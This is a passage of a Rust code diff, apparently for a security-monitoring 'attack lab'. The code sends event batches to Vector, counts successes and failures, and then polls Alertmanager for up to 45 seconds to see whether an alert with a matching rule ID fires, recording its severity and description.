+                        sent += chunk.len();
+                    } else {
+                        failed += chunk.len();
+                    }
+                }
+                Err(_) => {
+                    failed += chunk.len();
+                }
+            }
+        }
+
+        if sent == 0 {
+            return AttackLabResult {
+                attack_name: attack_name.to_string(),
+                rule_id: rule_id.to_string(),
+                events_sent: 0,
+                events_failed: failed,
+                alert_detected: false,
+                alert_severity: String::new(),
+                alert_description: "Failed to send any events to Vector".to_string(),
+            };
+        }
+
+        // Poll Alertmanager for up to 45 seconds
+        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(45);
+        let mut alert_detected = false;
+        let mut alert_severity = String::new();
+        let mut alert_description = String::new();
+
+        while std::time::Instant::now() < deadline {
+            std::thread::sleep(std::time::Duration::from_secs(3));
+
+            let alerts_url = format!("{}/api/v2/alerts", alertmanager_url);
+            match client.get(&alerts_url).send() {
+                Ok(resp) if resp.status().is_success() => {
+                    if let Ok(alerts) = resp.json::<Vec<serde_json::Value>>() {
+                        for a in &alerts {
+                            let labels = a.get("labels").cloned().unwrap_or_default();
+                            let rid = labels.get("rule_id").and_then(|v| v.as_str()).unwrap_or("");
+                            if rid == rule_id {
+                                alert_detected = true;
+                                alert_severity = labels
+                                    .get("severity")
+                                    .and_then(|v| v.as_str())
+                                    .unwrap_or("unknown")
+                                    .to_string();
+                                let annotations = a.get("annotations").cloned().unwrap_or_default();
+                                alert_description = annotations
+                                    .get("description")
+                                    .and_then(|v| v.as_str())
+                                    .unwrap_or("")
+                                    .to_string();
+                                break;
+                            }
+                        }
+                    }
+                }
+                _ => {}
+            }
+
+            if alert_detected {
+                break;
+            }
+        }
+
+        AttackLabResult {
+            attack_name: attack_name.to_string(),
+            rule_id: rule_id.to_string(),
+            events_sent: sent,
+            events_failed: failed,
+            alert_detected,
+            alert_severity,
+            alert_description,
+        }
     }
 }
